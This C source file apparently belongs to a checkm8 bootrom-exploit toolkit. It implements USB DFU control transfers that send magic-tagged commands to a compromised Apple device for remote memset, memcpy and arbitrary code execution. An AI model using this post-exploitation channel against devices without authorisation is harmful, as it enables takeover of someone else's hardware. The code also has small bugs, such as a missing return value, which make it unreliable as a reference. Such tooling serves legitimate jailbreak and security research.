#include "command.h"

#include "checkm8.h"
#include "libusb_helpers.h"
#include "libusb.h"

#include "stdlib.h"

int dfu_send_data(struct pwned_device *dev, unsigned char *data, long data_len)
{
    checkm8_debug_indent("dfu_send_data(dev = %p, data = %p, data_len = %li)\n", dev, data, data_len);
    long index = 0, amount;
    int ret;

    while(index < data_len)
    {
        if(data_len - index >= LIBUSB_MAX_PACKET_SIZE) amount = LIBUSB_MAX_PACKET_SIZE;
        else amount = data_len - index;

        checkm8_debug_indent("\tsending chunk of size %li at index %li\n", amount, index);
        ret = libusb_control_transfer(dev->bundle->handle, 0x21, 1, 0, 0, &data[index], amount, 5000);
        if(ret > 0) checkm8_debug_indent("\ttransferred %i bytes\n", ret);
        else
        {
            checkm8_debug_indent("\trequest failed with error code %i (%s)\n", ret, libusb_error_name(ret));
            return CHECKM8_FAIL_XFER;
        }
        index += amount;
    }
}

static unsigned char nullbuf[16] = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};

int command(struct pwned_device *dev,
            unsigned char *args, int arg_len,
            unsigned char *resp, int response_len)
{
    checkm8_debug_indent("command(dev = %p, args = %p, arg_len = %i resp = %p, response_len = %i)\n",
                         dev, args, arg_len, resp, response_len);
    if(!is_device_bundle_open(dev)) return CHECKM8_FAIL_NODEV;

    int ret;
    ret = dfu_send_data(dev, nullbuf, 16);
    if(IS_CHECKM8_FAIL(ret)) return ret;

    ret = libusb_control_transfer(dev->bundle->handle, 0x21, 1, 0, 0, nullbuf, 0, 100);
    if(ret >= 0) checkm8_debug_indent("\ttransferred %i bytes\n", ret);
    else
    {
        checkm8_debug_indent("\trequest failed with error code %i (%s)\n", ret, libusb_error_name(ret));
        return CHECKM8_FAIL_XFER;
    }

    ret = libusb_control_transfer(dev->bundle->handle, 0xA1, 3, 0, 0, nullbuf, 6, 100);
    if(ret >= 0) checkm8_debug_indent("\ttransferred %i bytes\n", ret);
    else
    {
        checkm8_debug_indent("\trequest failed with error code %i (%s)\n", ret, libusb_error_name(ret));
        return CHECKM8_FAIL_XFER;
    }

    ret = libusb_control_transfer(dev->bundle->handle, 0xA1, 3, 0, 0, nullbuf, 6, 100);
    if(ret >= 0) checkm8_debug_indent("\ttransferred %i bytes\n", ret);
    else
    {
        checkm8_debug_indent("\trequest failed with error code %i (%s)\n", ret, libusb_error_name(ret));
        return CHECKM8_FAIL_XFER;
    }

    ret = dfu_send_data(dev, args, arg_len);
    if(IS_CHECKM8_FAIL(ret)) return ret;

    if(response_len == 0)
    {
        ret = libusb_control_transfer(dev->bundle->handle,
                                      0xA1, 2, 0xFFFF, 0,
                                      resp, response_len + 1,
                                      100);
        if(ret >= 0) checkm8_debug_indent("\tfinal request transferred %i bytes\n", ret);
        else
        {
            checkm8_debug_indent("\tfinal request failed with error code %i (%s)\n", ret, libusb_error_name(ret));
            return CHECKM8_FAIL_XFER;
        }
    }
    else
    {
        ret = libusb_control_transfer(dev->bundle->handle,
                                      0xA1, 2, 0xFFFF, 0,
                                      resp, response_len,
                                      100);
        if(ret >= 0) checkm8_debug_indent("\tfinal request transferred %i bytes\n", ret);
        else
        {
            checkm8_debug_indent("\tfinal request failed with error code %i (%s)\n", ret, libusb_error_name(ret));
            return CHECKM8_FAIL_XFER;
        }
    }

    return CHECKM8_SUCCESS;
}

#define EXEC_MAGIC 0x6578656365786563ul // 'execexec'[::-1]
#define MEMC_MAGIC 0x6d656d636d656d63ul // 'memcmemc'[::-1]
#define MEMS_MAGIC 0x6d656d736d656d73ul // 'memsmems'[::-1]
#define DONE_MAGIC 0x646f6e65646f6e65ul // 'donedone'[::-1]

int dev_memset(struct pwned_device *dev, long addr, unsigned char c, int len)
{
    checkm8_debug_indent("dev_memset(dev = %p, addr = %lx, c = %x, len = %li)\n", dev, addr, c, len);
    unsigned long long cmd_args[5];
    cmd_args[0] = MEMS_MAGIC;
    cmd_args[1] = 0;
    cmd_args[2] = addr;
    cmd_args[3] = (unsigned long long) c;
    cmd_args[4] = len;

    unsigned long long cmd_resp;
    return command(dev,
                   (unsigned char *) &cmd_args, 5 * sizeof(unsigned long long),
                   (unsigned char *) &cmd_resp, 1 * sizeof(unsigned long long));
}

int dev_memcpy(struct pwned_device *dev, long dest, long src, int len)
{
    checkm8_debug_indent("dev_memset(dev = %p, dest = %lx, src = %lx, len = %li)\n", dev, dest, src, len);
    unsigned long long cmd_args[5];
    cmd_args[0] = MEMC_MAGIC;
    cmd_args[1] = 0;
    cmd_args[2] = dest;
    cmd_args[3] = src;
    cmd_args[4] = len;

    unsigned long long cmd_resp;
    return command(dev,
                   (unsigned char *) &cmd_args, 5 * sizeof(unsigned long long),
                   (unsigned char *) &cmd_resp, 1 * sizeof(unsigned long long));
}

int dev_exec(struct pwned_device *dev, int response_len, int nargs, unsigned long long *args)
{
    checkm8_debug_indent("dev_exec(dev = %p, response_len = %lu, nargs = %i, args = %p\n", dev, response_len, nargs,
                         args);
    if(nargs > 7)
    {
        checkm8_debug_indent("\ttoo many args\n");
        return CHECKM8_FAIL_INVARGS;
    }

    int ret, i;
    unsigned long long *argbase;
    checkm8_debug_indent("\tcopying args\n");

    unsigned long long cmd_args[1 + nargs];
    unsigned long long cmd_resp[1 + response_len];

    cmd_args[0] = EXEC_MAGIC;
    cmd_args[1] = 0;
    argbase = (unsigned long long *) ((unsigned char *) &cmd_args[1] + 0);
    for(i = 0; i < nargs; i++)
    {
        argbase[i] = args[i];
        checkm8_debug_indent("\t\t0x%lx (0d%li) (%s)\n", args[i], args[i], (char *) &args[i]);
    }

    ret = command(dev,
                  (unsigned char *) cmd_args, (1 + nargs) * sizeof(unsigned long long),
                  (unsigned char *) cmd_resp, 16 + 8 * response_len);

    if(ret == CHECKM8_SUCCESS && ((unsigned long *) cmd_resp)[0] != DONE_MAGIC) return CHECKM8_FAIL_NOTDONE;
    else
    {
        checkm8_debug_indent("\tgot retval %lX\n", cmd_resp[1]);
        return ret;
    }
}